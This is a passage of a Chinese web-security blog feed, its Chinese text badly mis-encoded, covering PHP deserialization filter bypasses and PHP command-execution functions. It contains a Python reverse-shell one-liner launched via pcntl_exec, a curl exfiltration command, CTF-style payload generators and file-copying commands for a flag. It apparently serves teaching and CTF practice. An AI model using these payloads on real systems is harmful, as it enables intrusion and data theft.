href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4">php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿</a></p><h3 id="GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸"><a href="#GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸" class="headerlink" title="GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸"></a>GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸</h3><blockquote><p>æ­£å¸¸æƒ…å†µä¸‹æŠ›å‡ºå¼‚å¸¸å¹¶ä¸”æ²¡æœ‰æ•æ‰çš„è¯phpæ˜¯ä¸ä¼šæ‰§è¡Œææ„å‡½æ•°çš„</p><p>ä½†åœ¨laravelè¿™ç§æ¡†æ¶é‡Œé€šå¸¸éƒ½æœ‰å…¨å±€çš„é”™è¯¯å¤„ç†ä¸å¼‚å¸¸æ•æ‰ï¼Œæ˜¾ç¤ºé€šç”¨çš„500æˆ–è€…é”™è¯¯é¡µé¢ã€‚ åªè¦å¼‚å¸¸è¢«æ•æ‰ï¼Œåé¢çš„ææ„å°±ä¼šæ‰§è¡Œäº†ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> test, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;i:1;N&#x27;</span>, <span class="string">&#x27;i:0;N&#x27;</span>, <span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>å› ä¸º<strong>ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œ</strong>çš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†<code>Array[0]</code>è®¾ç½®ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†<code>Array[0]</code>è®¾ç½®ä¸º<code>null</code>ï¼Œè¿™æ ·å‰é¢çš„<code>test</code>å¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ<code>__destruct</code>äº†</p></blockquote><h3 id="ç»•è¿‡æ­£åˆ™"><a href="#ç»•è¿‡æ­£åˆ™" class="headerlink" title="ç»•è¿‡æ­£åˆ™"></a>ç»•è¿‡æ­£åˆ™</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>ç”¨+Oä»£æ›¿O</p></li><li><p>ç”¨æ•°ç»„ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></li></ul><h3 id="ç»•è¿‡å­—ç¬¦è¿‡æ»¤"><a href="#ç»•è¿‡å­—ç¬¦è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å­—ç¬¦è¿‡æ»¤"></a>ç»•è¿‡å­—ç¬¦è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>åºåˆ—å­—ç¬¦ä¸²ä¸­<strong>è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚</strong></p></blockquote><h3 id="ç»•è¿‡wake-up"><a href="#ç»•è¿‡wake-up" class="headerlink" title="ç»•è¿‡wake_up"></a>ç»•è¿‡wake_up</h3><ul><li><strong>phpç‰ˆæœ¬ PHP5&lt;5.6.25ï¼ŒPHP7 &lt; 7.0.10</strong></li></ul><p><strong>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡<code>__wakeup( )</code>çš„æ‰§è¡Œã€‚</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span>= <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//ç»•è¿‡preg_match()</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:3:&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//ç»•è¿‡__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å¼•ç”¨å˜é‡</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014.png" alt="image-20221026153815014"></p><blockquote><p>åœ¨phpé‡Œ&amp;ç›¸å½“äºä¸¤ä¸ªå˜é‡éƒ½æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œä¿®æ”¹ä¸€ä¸ªä¼šå½±å“åˆ°å¦ä¸€ä¸ªã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»»æ„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()å’Œåå¼•å·</span><br><span class="line"><span class="title function_ invoke__">popen</span>()ï¼Œ<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é»˜è®¤æœ‰å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( å‘½ä»¤ï¼Œç»“æœæ•°ç»„ ï¼ŒçŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾ï¼Œè¦æƒ³è·å¾—ç»“æœï¼Œå°±è¦è¾“å‡ºç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„çŠ¶æ€ç ä¸º0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h3 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( å‘½ä»¤, çŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯æ‰§è¡Œäº†<code>sh -c &quot;command&quot;</code>å‘½ä»¤</p><p><strong>system()å‡½æ•°</strong>æ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( å‘½ä»¤, çŠ¶æ€ç   )</span><br></pre></td></tr></table></figure><p>å’Œ<strong>systemå‡½æ•°</strong>ç±»ä¼¼ï¼Œæ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="shell-exec-å’Œ-åå¼•å·"><a href="#shell-exec-å’Œ-åå¼•å·" class="headerlink" title="shell_exec()å’Œ åå¼•å·"></a><strong>shell_exec()å’Œ åå¼•å·</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( å‘½ä»¤ )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()å‡½æ•°</strong>é»˜è®¤æ— å›æ˜¾ï¼Œé€šè¿‡ <strong>echo</strong> å¯å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() å‡½æ•°å®é™…ä¸Šä»…æ˜¯åæ’‡å· () æ“ä½œç¬¦çš„å˜ä½“ï¼Œå½“ç¦ç”¨shell_execæ—¶ï¼Œ&#96; ä¹Ÿä¸å¯æ‰§è¡Œ</strong></p><p>åå¼•å·åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>å‡½æ•°éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡Œçš„å‘½ä»¤**<code>command</code><strong>ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æŒ‡é’ˆæ–‡ä»¶çš„è¿æ¥æ¨¡å¼</strong><code>mode</code>**ï¼Œæœ‰<code>r</code>å’Œ<code>w</code>ä»£è¡¨è¯»å’Œå†™ã€‚</p><p>å‡½æ•°ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤å·²ç»æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p>ä¸<code>popen()</code>ç±»ä¼¼ï¼Œåªæ˜¯å¯ä»¥å¼€ä¸¤ä¸ªç®¡é“ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å…¥ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯ </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“ </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› ä¸º1æ˜¯è¾“å‡ºå†…å®¹ stream_get_contents â€” è¯»å–èµ„æºæµåˆ°ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h3><p>å‰ææ¡ä»¶ï¼š<strong>PHPå®‰è£…å¹¶å¯ç”¨äº†pcntlæ’ä»¶</strong></p><p>pcntlæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ‰©å±•ï¼Œå¯ä»¥æ”¯æŒphpçš„å¤šçº¿ç¨‹æ“ä½œã€‚å¾ˆå¤šæ—¶å€™ä¼šç¢°åˆ°ç¦ç”¨execå‡½æ•°çš„æƒ…å†µï¼Œä½†å¦‚æœè¿ç»´äººå‘˜å®‰å…¨æ„è¯†ä¸å¼ºæˆ–å¯¹PHPä¸ç”šäº†è§£ï¼Œåˆ™å¾ˆæœ‰å¯èƒ½å¿½ç•¥pcntlæ‰©å±•çš„ç›¸å…³å‡½æ•°ã€‚</p><p>pcntl_exec()æ˜¯pcntlæ’ä»¶ä¸“æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°ï¼Œå¯ä»¥åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚</p><p>åˆ©ç”¨pcntl_exec()æ‰§è¡Œtest.shï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">   <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/test.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äºpcntl_exec()æ‰§è¡Œå‘½ä»¤æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥å…¶å¸¸ä¸pythonç»“åˆæ¥åå¼¹shellï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;ip&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹"><a href="#åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹" class="headerlink" title="åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹"></a>åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹</h2><h3 id="æœ‰å›æ˜¾æƒ…å†µ"><a href="#æœ‰å›æ˜¾æƒ…å†µ" class="headerlink" title="æœ‰å›æ˜¾æƒ…å†µ"></a>æœ‰å›æ˜¾æƒ…å†µ</h3><p>pingå‘½ä»¤è§‚å¯ŸTTLï¼Œwindowsä¸€èˆ¬åœ¨100ä»¥ä¸Šï¼Œlinuxä¸€èˆ¬æ˜¯100ä»¥ä¸‹ã€‚</p><h3 id="æ— å›æ˜¾æƒ…å†µ"><a href="#æ— å›æ˜¾æƒ…å†µ" class="headerlink" title="æ— å›æ˜¾æƒ…å†µ"></a>æ— å›æ˜¾æƒ…å†µ</h3><ul><li><p>è·¯å¾„å¤§å°å†™æ•æ„Ÿ</p></li><li><p>é€šè¿‡<code>ping</code>å‘½ä»¤</p><blockquote><p>Windowsä¸‹çš„Pingå‘½ä»¤æ¯é—´éš”ä¸€ç§’ä¼šå‘é€ä¸€ä¸ªICMP ECHO_REQUEST åŒ…ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ Ping å‘½ä»¤æ¥è¿‘ä¼¼åœ°æ¨¡æ‹Ÿç­‰å¾…æŒ‡å®šç§’æ•°çš„æ•ˆæœ</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -n 2 127.0.0.1</span><br><span class="line">ping -n 3 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230519171132332.png" alt="image-20230519171132332"></p><p><img src="/../images/image-20230519171119146.png" alt="image-20230519171119146"></p></li></ul><h2 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h2><ul><li><p>åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŠ¥é”™</span><br><span class="line">å»¶æ—¶</span><br></pre></td></tr></table></figure></li><li><p>åå¼¹shell</p><p>åœ¨çº¿ç”Ÿæˆï¼š<a href="https://zgao.top/tools/reverse/">https://zgao.top/tools/reverse/</a></p></li><li><p>å¤–å¸¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl ip:port\`cmd`</span><br><span class="line">dnslog</span><br></pre></td></tr></table></figure><p>ä¸å‡ºç½‘+DNSè¯·æ±‚å‡ºç½‘</p><p><a href="https://github.com/A0WaQ4/HexDnsEchoT">https://github.com/A0WaQ4/HexDnsEchoT</a></p></li><li><p>å°†æ–‡ä»¶ç§»åŠ¨åˆ°å¯è®¿é—®ç›®å½•ï¼ˆç½‘ç«™ç›®å½•ï¼Œé™æ€ æ–‡ä»¶ç›®å½•ï¼‰</p><ul><li><p>è¯»å–å†…å®¹é‡å®šå‘å†™å…¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag &gt;1</span><br></pre></td></tr></table></figure></li><li><p>å¤åˆ¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /f* .</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºé“¾æ¥æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /f* 1</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="å†™ğŸ"><a href="#å†™ğŸ" class="headerlink" title="å†™ğŸ"></a>å†™ğŸ</h3><h4 id="ç¡®å®šç½‘ç«™è·¯å¾„"><a href="#ç¡®å®šç½‘ç«™è·¯å¾„" class="headerlink" title="ç¡®å®šç½‘ç«™è·¯å¾„"></a>ç¡®å®šç½‘ç«™è·¯å¾„</h4><ul><li><p>Windows</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /x /s /b yokan_test.js</span><br><span class="line">for /r c:\ %i in (yokan_test.js*) do @echo %i</span><br><span class="line">dir /s/a-d/b yokan_test.js</span><br></pre></td></tr></table></figure></li><li><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -type f -name 1.js|while read f;do sh -c &#x27;id;pwd;hostname;/sbin/ifconfig&#x27; &gt;$(dirname $f)/test.txt;done</span><br><span class="line"></span><br><span class="line">locate /js/1.js|while read f;do sh -c &#x27;id;pwd;ifconfig&#x27;&gt;$(dirname $f)/test1.txt;done</span><br></pre></td></tr></table></figure></li></ul><h4 id="å‡ºç½‘"><a href="#å‡ºç½‘" class="headerlink" title="å‡ºç½‘"></a>å‡ºç½‘</h4><ul><li><p>è¿œç¨‹ä¸‹è½½</p><p><a href="https://paper.seebug.org/834/#windows">çº¢é˜Ÿåæ¸—é€æµ‹è¯•ä¸­çš„æ–‡ä»¶ä¼ 